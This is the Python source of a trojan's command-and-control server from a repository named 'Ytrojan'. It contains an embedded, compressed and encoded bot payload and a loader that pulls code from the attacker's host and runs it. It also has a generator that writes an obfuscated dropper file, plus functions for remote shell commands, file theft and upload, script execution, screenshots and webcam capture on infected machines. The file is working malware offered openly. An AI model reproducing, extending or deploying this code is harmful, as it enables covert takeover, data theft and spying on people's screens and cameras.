# https://github.com/ycy20090311/Ytrojan
# Control function encapsulation

import zlib
import json
import base64
import struct
import socket


# malicious code
bot_code = b"""\
eJzFWFtv2zYUfvevEPgkIZqQFlkfjHlA0aaNga0x2mx7CAKBlmibjURq\
JBUnKPLfdyhSoihbthNgmx5iijw3fueq0LLiQgWUT6hZcdmusoe37VI+\
dbvfJWfteokleXfRESlRZ6p749k96d6qAqsVF2V3Wi8rwTMi5WQleBks\
5r8F9mhe4jX5LPByMplkBZYy+ELUpRBchJePGakU5SyaTgJ4KjidTHKy\
CiRheapNC43eqflJzE9cgiKQOs1ppqLgp1+DL5wRI0OJJ7PQj6VLc6xw\
MGvumuR1WcnQnkQJYRnPSRjt8BSErdUGuGAR9gU50tYoMBYXRWgASyqc\
3YeIonggKgrOgl05pMHAmSwwlaSDyKAhSPYwjkYDgEbiAADdZayNNXNW\
WmFaSXgRRbfnd2P4LRHqjrYbWpBdbIJfBjqdLTsCz2ae7jfnby8ctoKo\
WjDjsoLjXO7xwSnYQahTtuLpBrO8AD/7YFktbTgDLrgEoiTFUhNBWBgh\
G1IUrQjKqlpNCyrVLaB5FytaEg47S86LQ76gq6Al9TCxiaOd02VRImpm\
FMVS5cAy650t5otLvU2E6G9/u/l4/cdN3Ng6uxE1iRV5VHZlFM9+dgCT\
QpL/zxCdsDvO/oGkwqqWaNrQIiAExWjaCjYWPDds+wNgKOcThls6QQhZ\
Zu3UnG+ZjqzWrxWGaAWPHvLhSgf9LOAVxL2mj5FYInePjDNFmNKp0pTS\
ZPnuwhYYzQlxjvMwipKcDIpOc5oVXPY3R1CxStDULl6BRyfCA6Su9sER\
W+KXQ7NdnqHBFbeCKhI6cCwQVkVXjKPXIPNiHJ5tcmeCVsrP7vauCjDZ\
11hMQMF1KU++KUHZen7dsw+Kjg1WjUhD6/LukWRGywi9fklT85qmp+aI\
+U3WRD3gogawduAIunYbYBn0cv9V2geZRRIs1rIXTIAqIUxuuBopvR6e\
3ZCQrOEPFGCJH0iIEicl+V6tB9HURtsO2b+alRxqIin5YfP+o9RtkN6S\
ZYZL3Y9GkHYEAMGt6e40h/W5OW46uTbQaTcsQAJDY/InzQn/gCswCPIj\
d7ekrXILIYwOfkfZ0ryZOiwVBGeoBX54v0gXX68X6aev73+/TP+af7y5\
ijzGDaHrjTrKeXU5/3x147O62ya4gvDIQ7A5biyJjdhoHwNcoSDY8/Ru\
h1zCPe/d9XM9wryZeFBoxQe8aOLAkaKpWz9P9rJYx/d5bu8830uGq65+\
5VPKhjPhcXc6V1J5DagRcGevthd4HVOdo84lxuX9WNBUPl5aHS1N0UeJ\
M9ZkaSPQ94Wf1kMGP60bBa9N7VbZTnrrp5/iAxt8whel+THithfrx/Rj\
ds9gRjk8uv4Apoa6xJS1PtuX0l69NQL+rklTE9z3RWo/KfyhHats05Lf\
IvVUETRI9MYX4IEA2Xkb7Z4bnbLiTBLTaLzBfEyeniJPkNaf0DtTmzaL\
7mJnuxk/0d2YunYoPK5xOD52OvTwM67ADFnHxfvD2EC4u1AbPaP6zHRz\
AoDeFDRE8IB02wBP0jCcCEak9kvdMal7ut9BqTqTT5Xar6sOkXwUjvS4\
Vwcp7dG7f3rYNIxbzqg5742QzTzXfugO01rXBVdJTF3oswfDF2/DjSQT\
eIJ/APkwZuY=\
"""

# Loading malicious code
loader_code = b"""
import zlib,base64,struct,socket
s = socket.socket()
while s.connect_ex(("%b",%b))!=0:pass
try:
    size = struct.unpack("i",s.recv(4))[0]
    code = b''
    while len(code) < size:
        code+=s.recv(1024)
    exec(zlib.decompress(base64.b64decode(code)),{'_socket':s})
except:
    exit(0)
"""

# A network function that encapsulates the sending and receiving of data

class NetError(Exception):
    pass

def send_json(socket:socket.socket,message:dict) -> None:
    try:
        message_data = json.dumps(message).encode()
        message_length = len(message_data)
        socket.sendall(struct.pack("i", message_length) + message_data)
    except:
        raise NetError

def recv_json(socket:socket.socket) -> dict:
    try:
        message_length = struct.unpack("i", socket.recv(4))[0]
        message_data = b""
        while len(message_data) < message_length:
            message_data += socket.recv(1024)
        return json.loads(message_data)
    except:
        raise NetError


# Basic Function

bot_list:list[socket.socket] = []

def generate(host:str,port:str,path:str) -> None:
    code =  base64.b64encode(zlib.compress(loader_code % (host.encode(),port.encode())))
    content = b"import zlib,base64;exec(zlib.decompress(base64.b64decode(b'%b')))" % code
    file = open(path,"wb+")
    file.write(content)
    file.close()
    
def serice(socket:socket.socket) -> None:
    try:
        socket.listen()
        while True:
            bot_socket,bot_addr = socket.accept()
            load_botcode(bot_socket)
            bot_list.append(bot_socket)
    except ConnectionResetError:
        pass
    
    
# Remotely load malicious code

def load_botcode(socket:socket.socket) -> None:
    message_data = bot_code
    message_length = len(message_data)
    socket.sendall(struct.pack("i",message_length) + message_data)  


# Functional functions that interact with the bot

def sysinfo(socket:socket.socket) -> dict:
    request = {"type":"sysinfo"}
    send_json(socket,request)
    response = recv_json(socket)
    return response
    
def shell(socket:socket.socket,input:list[str],timeout:bool) -> tuple:
    request = {"type":"shell","input":input,"timeout":timeout}
    send_json(socket,request)
    response = recv_json(socket)
    return (response["status"],response["output"])

def download(socket:socket.socket,remote_path:str,local_path:str) -> bool:
    request = {"type":"download","path":remote_path}
    send_json(socket,request)
    response = recv_json(socket)
    
    if response["status"]:
        file = open(local_path,"wb+")
        file.write(base64.b64decode((response["content"].encode())))
        file.close()
    return response["status"]

def upload(socket:socket.socket,local_path:str,remote_path:str) -> bool:
    file = open(local_path,"rb")
    content = base64.b64encode(file.read()).decode()
    file.close()
    
    request = {"type":"upload","path":remote_path,"content":content}
    send_json(socket,request)
    response = recv_json(socket)
    return response["status"]

def script(socket:socket.socket,local_path:str) -> tuple:
    file = open(local_path,"r")
    input = file.read()
    file.close()
    
    request = {"type":"script","input":input}
    send_json(socket,request)
    response = recv_json(socket)
    return (response["status"],response["output"])
    
def screenshot(socket:socket.socket,local_path:str) -> bool:
    request = {"type":"screenshot"}
    send_json(socket,request)
    response = recv_json(socket)
    
    if response["status"]:
        file = open(local_path,"wb+")
        file.write(base64.b64decode((response["content"].encode())))
        file.close()
    return response["status"]
        
def webcamlist(socket:socket.socket) -> tuple:
    request = {"type":"webcamlist"}
    send_json(socket,request)
    response = recv_json(socket)
    return (response["status"],response["webcamlist"])

def webcamsnap(socket:socket.socket,id:int,local_path:str) -> bool:
    request = {"type":"webcamsnap","id":id}
    send_json(socket,request) 
    response = recv_json(socket)
    
    if response["status"]:
        file = open(local_path,"wb+")
        file.write(base64.b64decode((response["content"].encode())))
        file.close()
    return response["status"]
    
def kill(id:int) -> None:
    bot_list.pop(id)

        
            


 
